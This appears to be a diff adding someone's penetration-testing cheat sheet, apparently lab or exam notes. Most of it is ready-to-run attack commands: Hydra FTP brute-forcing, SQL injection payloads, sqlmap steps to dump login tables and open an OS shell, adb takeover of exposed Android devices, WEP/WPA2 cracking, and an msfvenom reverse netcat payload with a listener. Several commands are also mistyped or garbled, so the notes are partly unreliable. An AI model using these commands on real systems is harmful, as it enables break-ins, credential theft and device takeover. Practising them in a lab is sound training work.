@@ -1,0 +1,92 @@
+CRACK FTP CREDENTIALS AND ENTER
+open the terminal where you have the lists.txt for crack user and pwd
+hydra -L /home/attacker/Desktop/Wordlists/Username.txt -P /home/attacker/Desktop/Wordlists/Password.txt ftp://192.168.10.1
+hydra -l username -P password.txt ftp://192.168.178.1
+get file.txt
+open terminal cat file.txt
+
+SQL INJECTIONS METHODs
+to find the cookie in firefox open inspect and in console type document.
+user 'OR 1=1 --
+hi'OR 1=1 --
+ blah'
+blah';insert into login values('john','apple123');--
+console tab write -  document.cookie
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
+Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
+6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
+6.1 In the shell type-   TASKLIST  (to view the tasks)
+6.2 Use systeminfo for windows to get all os version
+6.3 Use uname -a for linux to get os version
+
+Check method that the site was vulnerable use OWASP ZAP in the parrot machine and use automated SCAN
+
+check with ping scan how many hosts are alive
+nmap -sn 192.168.178.0/24 this check the subnet and the number hosts are alive
+
+Android Hack
+nmap ip -sV -p 5555    (Scan for adb port)
+2- adb connect IP:5555    (Connect adb with parrot)
+3- adb shell              (Access mobile device on parrot)
+
+sudo -i 
+adb pull  /folder1/folder2 to obtain the files 
+
+nmap 192.168.178.0/24 -sV -p 5555
+
+
+How to check Entropy of a files 
+
+ent -h (for help)
+apt install ent
+ent file.elf 
+the same for all the elf file to find the highest or the lower entropy value
+
+How to find the hash of a file 
+use sha384sum to find the hash if the hash is sha384sum 
+sha384sum file.elf and find the sha384 of the files
+or check online https://emn178.github.io/online-tools/sha384_file_hash.html 
+
+
+FINDING A FULL QUALIFIED DOMAIN NAME
+nmap -p389 -sV -iL targetiplist.txt
+nmap -p389 -sV 192.168.178.0/24
+you can retrive the host and the domain and compose the fully qualified domain name
+
+
+CRACK WIFI 
+WEP FILES 
+aircrack-ng [pcapfile] -w [wordlists.txt]
+
+
+WPA 2 
+aircrack-ng -a2 -b [target BSSID] -w [password_wordlist.txt] [wp2 PCAP file]
+-a is the technique 2=wpa technique
+-b refers to bssid 
+-w wordlist with the path of the wordlist 
+
+Check all the IP on a subnet 
+sudo arp-scan -local or netdiscover -i 192.168.0.0 or nmap -sn 192.168.0.0/24
+
+
+nmap -p 22,23,80,3389 192.168.0.0/24
+telnet 192.168.0.0.x:80 GET /HTTP/1.0
+
+
+NET CATE USE WITH MSFVENOM
+msfvenom -p cmd/unix/reverse_netcat LHOST=ip_attacker LPORT=444 \
+start listen : nc-lnvp 444
+
+
+How TO FIND VULNERABILITIES 
+With NMAP:
+nmap -Pn --script vuln 192.168.178.1
+or try a scan with nessus or openvas
+
+http vuln and enum
+nmap -sv --script=http-enum ip_address
+
+use burp with http 
+open burpsuite and start the proxy 
+
